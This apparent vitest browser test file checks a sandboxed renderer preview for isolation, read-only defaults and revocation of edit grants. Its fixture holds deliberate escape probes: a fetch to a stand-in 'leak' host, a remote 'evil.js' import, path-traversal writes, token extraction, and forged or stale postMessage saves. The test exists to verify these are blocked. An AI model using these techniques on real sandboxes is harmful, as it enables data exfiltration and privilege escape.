import {fileFixture} from '@/test/fileFixtures';
import {useCollimateStore} from '@/stores/useCollimateStore';
import {it,expect,vi} from 'vitest';
import {render} from 'vitest-browser-react';
import {page,commands} from 'vitest/browser';
import {NativeRenderer} from '../NativeRenderer';
import {flushRendererEditors} from '@/lib/rendererFlush';
declare module 'vitest/browser' {interface BrowserCommands {previewText():Promise<string>;previewInput(value:string):Promise<void>;previewClick(name:string):Promise<void>;}}
const save=vi.hoisted(()=>vi.fn(async(_cell:string|undefined,_path:string,_content:string,_readOnly?:boolean)=>({ok:true})));
vi.mock('@/lib/siblingWrite',()=>({saveSiblingFileInCell:save}));
vi.mock('@/lib/api',async original=>({...await original<typeof import('@/lib/api')>(),getApiUrl:()=>`${window.location.origin}/api`}));
vi.mock('@/lib/cellFileCap',async original=>({...await original<typeof import('@/lib/cellFileCap')>(),cellFileCap:async()=> 'testcap'}));
function admitFixtureFiles(files:Map<string,string>,cellId='preview-cell'){
 useCollimateStore.setState(state=>({cellCache:{...state.cellCache,[cellId]:{id:cellId,name:'Preview',files:[...files].map(([name,body])=>fileFixture(name,body))}}}));
}
const renderer=`export default {mount(container,api){
 const field=document.createElement('textarea');field.setAttribute('aria-label','Sample editor');field.disabled=api.isReadOnly();api.getContent().then(text=>field.value=text);field.oninput=()=>api.reportChange(field.value);container.append(field);
 for(const [name,path] of [['Write sibling','output.txt'],['Write package','pkg/main.js'],['Write definition','elsewhere/bad.handler'],['Write traversal','../escape.txt'],['Write options','outside.options_stack'],['Write uppercase definition','outside.HANDLER']]){const button=document.createElement('button');button.textContent=name;button.onclick=()=>api.saveSiblingFile(path,'changed');container.append(button);}
 const refuse=document.createElement('button');refuse.textContent='Try initial write';refuse.onclick=()=>api.reportChange('denied');container.append(refuse);
 const navigate=document.createElement('button');navigate.textContent='Navigate away';navigate.onclick=()=>{const send=MessagePort.prototype.postMessage;MessagePort.prototype.postMessage=function(data,...args){if(data?.op!=='depart')return send.call(this,data,...args);};window.addEventListener('pagehide',event=>event.stopImmediatePropagation(),{capture:true});const token=JSON.parse(atob([...document.scripts].map(script=>script.textContent.match(/atob\\('([^']+)'\\)/)).find(Boolean)[1])).token;location.href=api.getFileUrl('sample.txt').split('/api/')[0]+'/__d14_navigation__?token='+encodeURIComponent(token);};container.append(navigate);
 const security=document.createElement('button');security.textContent='Probe isolation';security.onclick=async()=>{
  const result={};for(const [key,probe] of [['parent',()=>parent.document.body],['storage',()=>localStorage.getItem('x')]]){try{probe();result[key]=false;}catch{result[key]=true;}}
  try{await fetch('https://unlisted.invalid/leak');result.fetch=false;}catch{result.fetch=true;}
  try{await Function("return import('https://unlisted.invalid/evil.js')")();result.script=false;}catch{result.script=true;}
  await api.saveSiblingFile('isolation.json',JSON.stringify(result));
 };container.append(security);
 return()=>container.replaceChildren();}};`;
it('mounts actual worker output in an opaque preview and guards every write per mount __D14_P4F02_P4F11_F1859_F1860_P3F07',async()=>{
 const files=new Map([['pkg/main.js',renderer],['pkg/demo.renderer','id: demo\nname: Demo\nentrypoint: main.js\nembed: native\nextensions: [.txt]\n'],['sample.txt','original'],['preview.renderer_example','{"renderer":"pkg/demo.renderer","file":"sample.txt"}']]);
 const fetchActual=globalThis.fetch;
 const fetchSpy=vi.spyOn(globalThis,'fetch').mockImplementation(async(input,init)=>{
   const url=String(input);
   if(url.includes('/file-paths'))return new Response(JSON.stringify({paths:[...files.keys()]}),{headers:{'Content-Type':'application/json'}});
   const marker='/files/';const start=url.indexOf(marker);
   if(start>=0){const name=decodeURIComponent(url.slice(start+marker.length).split('?')[0]);return new Response(files.get(name)||'',{status:files.has(name)?200:404});}
   return fetchActual(input,init);
 });
 save.mockReset();save.mockImplementation(async(_cell,path,content)=>{files.set(path,content);return {ok:true};});
 const hashes:Array<{active:boolean;contentHash:string}>=[];const capture=(e:Event)=>hashes.push((e as CustomEvent).detail);window.addEventListener('collimate:renderer-preview',capture);
 const props={isActiveFocus:true,rendererId:'fixture-renderer-preview',rendererHash:'d14',fileName:'preview.renderer_example',cellId:'preview-cell',channel:'preview',fileContent:files.get('preview.renderer_example')!};
 admitFixtureFiles(files,props.cellId);
 const view=await render(<NativeRenderer {...props}/>);
 try{
   await expect.element(page.getByRole('status'),{timeout:30000}).toMatchTextContent('Preview mounted');
   await expect.element(page.getByText('Unapproved renderer. Preview dependencies execute offline. Prepare dependencies is the only preview action that accesses the network. Use an example file.')).toBeVisible();
   const frame=[...document.querySelectorAll('*')].map(node=>node.shadowRoot?.querySelector('iframe[title="Sealed renderer preview"]')).find(Boolean) as HTMLIFrameElement;
   expect(frame.sandbox.value).toBe('allow-scripts');expect(frame.contentDocument).toBeNull();
   await commands.previewClick('Try initial write');await expect.element(page.getByRole('status')).toMatchTextContent('preview is read-only');expect(save).not.toHaveBeenCalled();
   await page.getByRole('checkbox',{name:'Allow edits for this preview'}).click();
   await commands.previewInput('user edit');await vi.waitFor(()=>expect(save).toHaveBeenCalledWith('preview-cell','sample.txt','user edit',false));
   await commands.previewClick('Write sibling');await vi.waitFor(()=>expect(files.get('output.txt')).toBe('changed'));
   await commands.previewClick('Probe isolation');await vi.waitFor(()=>expect(JSON.parse(files.get('isolation.json')||'{}')).toEqual({parent:true,storage:true,fetch:true,script:true}));
   const config=JSON.parse(atob(frame.srcdoc.match(/atob\('([^']+)'\)/)![1]));
   const wrongSource=document.createElement('iframe');wrongSource.sandbox.add('allow-scripts');wrongSource.srcdoc=`<script>parent.postMessage(${JSON.stringify({tag:'collimate-preview',token:config.token,id:90,op:'save',path:'source-escape.txt',content:'bad'})},'*')</script>`;document.body.append(wrongSource);
   window.dispatchEvent(new MessageEvent('message',{source:frame.contentWindow,origin:'null',data:{tag:'collimate-preview',token:'stale-token',id:91,op:'save',path:'token-escape.txt',content:'bad'}}));
   await new Promise(resolve=>setTimeout(resolve,100));wrongSource.remove();expect(files.has('source-escape.txt')).toBe(false);expect(files.has('token-escape.txt')).toBe(false);
   const accepted=save.mock.calls.length;
   for(const name of ['Write package','Write definition','Write traversal','Write options','Write uppercase definition'])await commands.previewClick(name);
   await expect.element(page.getByRole('status')).toMatchTextContent('preview is read-only');expect(save).toHaveBeenCalledTimes(accepted);
   await flushRendererEditors('preview-cell','preview.renderer_example');
   expect(hashes.some(value=>value.active&&/^[a-f0-9]{64}$/.test(value.contentHash))).toBe(true);
   // A replacement mount loses its edit grant; stale old-frame messages cannot write.
   files.set('pkg2/main.js',renderer);files.set('pkg2/demo.renderer','id: second\nname: Second\nentrypoint: main.js\nembed: iframe\nextensions: [.txt]\n');
   admitFixtureFiles(files,props.cellId);
  await view.rerender(<NativeRenderer {...props} fileContent='{"renderer":"pkg2/demo.renderer","file":"sample.txt"}'/>);
   await vi.waitFor(()=>expect(frame.isConnected).toBe(false));
   await expect.element(page.getByRole('status'),{timeout:30000}).toMatchTextContent('Preview mounted');
   await expect.element(page.getByRole('checkbox',{name:'Allow edits for this preview'})).not.toBeChecked();
   const beforeStale=save.mock.calls.length;
   window.dispatchEvent(new MessageEvent('message',{source:frame.contentWindow,origin:'null',data:{tag:'collimate-preview',token:config.token,id:92,op:'save',path:'stale.txt',content:'bad'}}));
   await commands.previewClick('Try initial write');await expect.element(page.getByRole('status')).toMatchTextContent('preview is read-only');expect(save).toHaveBeenCalledTimes(beforeStale);
   await page.getByRole('checkbox',{name:'Allow edits for this preview'}).click();
   await commands.previewClick('Navigate away');
   await vi.waitFor(async()=>expect(await commands.previewText()).toContain('Replacement document'),{timeout:1000});
   // Its script already ran, but the delayed image prevents load invalidation.
   expect(hashes.at(-1)).toMatchObject({active:true});
   await new Promise(resolve=>setTimeout(resolve,100));
   expect(files.has('navigation-escape.txt')).toBe(false);
   await expect.element(page.getByRole('status')).toMatchTextContent('Preview navigated away; permission revoked');
   expect(hashes.at(-1)).toMatchObject({active:false});
   await view.unmount();await vi.waitFor(()=>expect(hashes.at(-1)).toMatchObject({active:false}));
 }finally{await view.unmount();fetchSpy.mockRestore();window.removeEventListener('collimate:renderer-preview',capture);}
},45000);

it.each([
 {embed:undefined, expected:'Preview mounted'},
 {embed:'unsupported', expected:'Preview renderer embed must be native or iframe'},
])('preview honors optional embed and rejects an invalid explicit value $embed __P3F09_D14',async({embed,expected})=>{
 const definition='id: optional-embed\nname: Optional embed\nsummary: Valid renderer with an optional host field\nentrypoint: main.js\n'+(embed===undefined?'':`embed: ${embed}\n`);
 const files=new Map([['pkg/main.js',renderer],['pkg/demo.renderer',definition],['sample.txt','optional embed sample']]);
 const fetchActual=globalThis.fetch;
 const fetchSpy=vi.spyOn(globalThis,'fetch').mockImplementation(async(input,init)=>{
  const url=String(input);
  if(url.includes('/file-paths'))return new Response(JSON.stringify({paths:[...files.keys()]}),{headers:{'Content-Type':'application/json'}});
  const start=url.indexOf('/files/');
  if(start>=0){const name=decodeURIComponent(url.slice(start+7).split('?')[0]);return new Response(files.get(name)||'',{status:files.has(name)?200:404});}
  return fetchActual(input,init);
 });
 admitFixtureFiles(files);
 const view=await render(<NativeRenderer rendererId="fixture-renderer-preview" rendererHash="optional-embed"
  fileName="preview.renderer_example" cellId="preview-cell" channel="preview" isActiveFocus
  fileContent='{"renderer":"pkg/demo.renderer","file":"sample.txt"}'/>);
 try{
  await expect.element(page.getByRole('status'),{timeout:30000}).not.toMatchTextContent('Loading preview…');
  expect(page.getByRole('status').element().textContent).toContain(expected);
  if(embed===undefined){
   expect(await commands.previewText()).toContain('Try initial write');
   const frame=[...document.querySelectorAll('*')].map(node=>node.shadowRoot?.querySelector('iframe[title="Sealed renderer preview"]')).find(Boolean) as HTMLIFrameElement;
   expect(JSON.parse(atob(frame.srcdoc.match(/atob\('([^']+)'\)/)![1])).embed).toBe('iframe');
  }
  else await expect.element(page.getByTitle('Sealed renderer preview')).not.toBeInTheDocument();
 }finally{await view.unmount();fetchSpy.mockRestore();}
},35000);

it('P4F04_P5F05 common React runtime mounts offline and missing dependencies prepare as inert bytes before frame execution',async()=>{
 const dependency='https://esm.sh/preview-fixture@1.2.3?target=es2022';
 const main=(extra='')=>`const commonURL='https://esm.sh/react@19.3.1?target=es2022';const React=(await import(commonURL)).default;import {defineRenderer} from '/api/sdk/react.js';${extra}export default defineRenderer({component:()=>{const [value]=React.useState('Common offline');return React.createElement('div',null,value${extra?'+label':''});}});`;
 const files=new Map([['pkg/main.js',main()],['pkg/demo.renderer','id: prepared\nname: Prepared\nentrypoint: main.js\nembed: native\nextensions: [.txt]\n'],['sample.txt','original']]);
 // Preparation fetches the module from the app's mirror, never the CDN.
 const mirrored=new URL('/api/mirror/esm.sh/preview-fixture@1.2.3?target=es2022',location.href).href;
 const actual=globalThis.fetch;let dependencyFetches=0;
 const spy=vi.spyOn(globalThis,'fetch').mockImplementation(async(input,init)=>{
  const url=String(input);
  if(url===dependency)throw new Error('Preparation fetched the CDN directly');
  if(url===mirrored){dependencyFetches++;return new Response('globalThis.__preparedModuleExecuted=true;export const label=" prepared";');}
  if(url.includes('/file-paths'))return Response.json({paths:[...files.keys()]});
  const index=url.indexOf('/files/');if(index>=0){const path=decodeURIComponent(url.slice(index+7).split('?')[0]);return new Response(files.get(path)??'',{status:files.has(path)?200:404});}
  return actual(input,init);
 });
 const props={rendererId:'fixture-renderer-preview',rendererHash:'prepared',cellId:'prepared-cell',channel:'preview',fileName:'preview.renderer_example',fileContent:'{"renderer":"pkg/demo.renderer","file":"sample.txt"}',isActiveFocus:true};
 admitFixtureFiles(files,props.cellId);
 const view=await render(<NativeRenderer {...props}/>);
 try{
  await vi.waitFor(async()=>expect(await commands.previewText()).toContain('Common offline'),{timeout:30000});expect(dependencyFetches).toBe(0);
  await expect.element(page.getByRole('button',{name:'Prepare dependencies'})).not.toBeInTheDocument();
  files.set('pkg/main.js',main(`import {label} from '${dependency}';`));
  admitFixtureFiles(files,props.cellId);
  await view.rerender(<NativeRenderer {...props} fileContent='{"renderer":"pkg/demo.renderer","file":"sample.txt","revision":1}'/>);
  await expect.element(page.getByRole('status'),{timeout:30000}).toMatchTextContent('Dependency is unprepared');expect(dependencyFetches).toBe(0);
  await page.getByRole('button',{name:'Prepare dependencies'}).click();
  await vi.waitFor(async()=>expect(await commands.previewText()).toContain('Common offline prepared'),{timeout:30000});expect(dependencyFetches).toBe(1);
  expect((globalThis as typeof globalThis&{__preparedModuleExecuted?:boolean}).__preparedModuleExecuted).toBeUndefined();
  files.set('pkg/main.js','const name="https://esm.sh/absent-fixture@1.2.3";import(name);export default {mount(){}};');
  admitFixtureFiles(files,props.cellId);
  await view.rerender(<NativeRenderer {...props} fileContent='{"renderer":"pkg/demo.renderer","file":"sample.txt","revision":2}'/>);
  await expect.element(page.getByRole('status'),{timeout:30000}).toMatchTextContent('Module is outside this preview snapshot');expect(dependencyFetches).toBe(1);
 }finally{await view.unmount();spy.mockRestore();}
},60000);
